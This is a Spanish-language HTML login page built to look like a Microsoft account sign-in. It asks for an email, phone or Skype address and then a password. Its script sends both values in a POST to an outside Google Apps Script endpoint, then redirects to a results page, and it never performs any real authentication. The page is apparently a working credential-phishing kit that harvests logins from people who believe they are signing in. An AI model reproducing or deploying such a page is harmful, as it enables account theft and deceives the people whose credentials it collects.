<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Empresa - Iniciar sesión</title>
  <style>
    body {
      font-family: 'Segoe UI', sans-serif;
      background: #f2f2f2;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
      overflow: hidden;
    }
    .login-box {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      width: 100%;
      max-width: 360px;
      position: relative;
      overflow: hidden;
      height: 300px;
      transition: height 0.3s ease-in-out;
    }
    .logo {
        margin-bottom: 20px;
        text-align: left;
    }
    .login-step {
      width: 100%;
      position: absolute;
      top: 100px; 
      left: 0;
      padding: 0 40px 40px 40px;
      box-sizing: border-box;
      transition: transform 0.4s ease-in-out, opacity 0.4s ease-in-out;
      transform: translateX(100%);
      opacity: 0;
      pointer-events: none;
    }
    .login-step.active {
      transform: translateX(0);
      opacity: 1;
      pointer-events: auto;
      position: relative;
      top: 0; 
    }
    .login-step:not(.active) {
        position: absolute;
    }
    input {
      width: 100%;
      border: none;
      border-bottom: 1px solid #8c8c8c;
      padding: 8px 0;
      margin-top: 20px;
      font-size: 16px;
      background-color: transparent;
      box-sizing: border-box;
      transition: border-bottom-color 0.3s ease;
    }
    input:focus {
        border-bottom-color: #0078d4;
        outline: none;
    }
    button {
      width: 100%;
      padding: 10px;
      margin-top: 30px;
      background-color: #0078d4;
      color: white;
      border: none;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
    }
    button:hover {
        background-color: #005ea6;
    }
    .heading {
        font-size: 24px;
        font-weight: 600;
        color: #1b1b1b;
        text-align: left;
    }
    .back-button {
      background: none;
      border: none;
      color: #333;
      font-size: 20px;
      cursor: pointer;
      text-align: left;
      padding: 0;
      width: auto; 
      margin: 0 10px 0 0;
      vertical-align: middle;
    }
     .back-button:hover {
        color: #0078d4;
     }
    .password-header {
        display: flex;
        align-items: center;
        margin-bottom: 10px;
    }
    .user-email {
        font-size: 14px;
        color: #333;
        vertical-align: middle;
    }
    .error-message {
      color: red;
      font-size: 12px;
      margin-top: 5px;
    }
  </style>
</head>
<body>
  <div class="login-box" id="loginBox">
    
    <div class="logo">
      <img src="https://i.postimg.cc/HxwyDPCG/pngegg.png" alt="Mi empresa Logo" width="120"/>
    </div>

    <form id="login-form">
        <div class="login-step active" id="email-step">
            <div class="heading">Iniciar sesión</div>
            <input type="email" name="correo" id="email-input" maxlength="113"
                   placeholder="Correo electrónico, teléfono o Skype" required>
            <div id="email-error" class="error-message" style="display: none;">Por favor, ingresa un correo válido.</div>
            <button type="button" id="next-email-button">Siguiente</button>
        </div>

        <div class="login-step" id="password-step">
            <div class="password-header">
                <button type="button" class="back-button" id="back-to-email">←</button>
                <span id="user-email-display" class="user-email"></span>
            </div>
            <div class="heading">Escribir contraseña</div>
            <input type="password" name="password" id="password-input" placeholder="Contraseña" required>
            <button type="submit">Iniciar sesión</button>
        </div>
    </form>
  </div>

  <script>
    const loginBox = document.getElementById('loginBox');
    const loginForm = document.getElementById('login-form');
    
    const emailStep = document.getElementById('email-step');
    const passwordStep = document.getElementById('password-step');
    
    const emailInput = document.getElementById('email-input');
    const userEmailDisplay = document.getElementById('user-email-display');
    const emailError = document.getElementById('email-error');
    
    const scriptURL = 'https://script.google.com/macros/s/AKfycbzVfcqJrq-HGOnnRbbrziepd_NKa-eqPmDQiIkI389JjnTecxzu_vNmFYKJx8Vyr2cp6A/exec';

    function showStep(stepToShow) {
        const allSteps = document.querySelectorAll('.login-step');
        allSteps.forEach(step => {
            step.classList.remove('active');
        });
        loginBox.style.height = "300px";
        stepToShow.classList.add('active');
    }

    function isValidEmail(email) {
      const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
      return emailPattern.test(email);
    }

    document.getElementById('next-email-button').addEventListener('click', function() {
      if (emailInput.value && isValidEmail(emailInput.value)) {
        userEmailDisplay.textContent = emailInput.value;
        showStep(passwordStep);
        emailError.style.display = 'none';
      } else {
        emailError.style.display = 'block';
        emailInput.focus();
      }
    });

    document.getElementById('back-to-email').addEventListener('click', function() {
        showStep(emailStep);
    });

    // 2. SCRIPT DE ENVÍO CON REDIRECCIÓN
    loginForm.addEventListener('submit', function(e) {
        e.preventDefault();
        
        const submitButton = this.querySelector('button[type="submit"]');
        submitButton.textContent = 'Enviando...';
        submitButton.disabled = true;

        fetch(scriptURL, { method: 'POST', body: new FormData(loginForm) })
            .then(response => {
                if (response.ok) {
                    window.location.href = 'resultado.html';
                } else {
                    throw new Error(`Error del servidor: ${response.statusText}`);
                }
            })
            .catch(err => {
                console.error('Error al enviar:', err);
                alert("Hubo un error al iniciar sesión. Por favor, inténtalo de nuevo.");
                submitButton.textContent = 'Iniciar sesión';
                submitButton.disabled = false;
            });
    });

    document.addEventListener('DOMContentLoaded', () => {
        showStep(emailStep); 
    });
  </script>
</body>
</html>
